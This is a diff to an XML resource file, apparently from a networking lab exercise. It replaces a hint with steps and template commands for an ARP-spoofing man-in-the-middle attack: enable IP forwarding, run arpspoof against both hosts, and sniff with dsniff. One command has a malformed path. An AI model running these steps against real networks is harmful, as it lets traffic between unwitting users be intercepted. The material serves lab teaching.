@@ -125,6 +125,17 @@
 
  The client IP is 138.93.0.10 and the Server IP is 172.217.9.14 
 
-Hints can be found on the hint button on the top right hand side of the taskbar</value>
+To do a man in the middle attack, you need to 
+1. enable ip forwarding
+2. arpspoof, telling the server you are the client
+3. arpspoof telling the client you are the server
+4. sniff the packets between the 2.
+
+Commands you will need are 
+ifconfig
+cat /proc/sys/net/ipv4/ip_forward
+echo '&lt;boolean 0 or 1&gt;' | sudo tee proc/sys/net/ipv4/ip_forward 
+sudo arpspoof -i &lt;internet connector&gt; -t &lt;target IP&gt; &lt;target IP&gt;
+sudo dsniff -c</value>
   </data>
 </root>
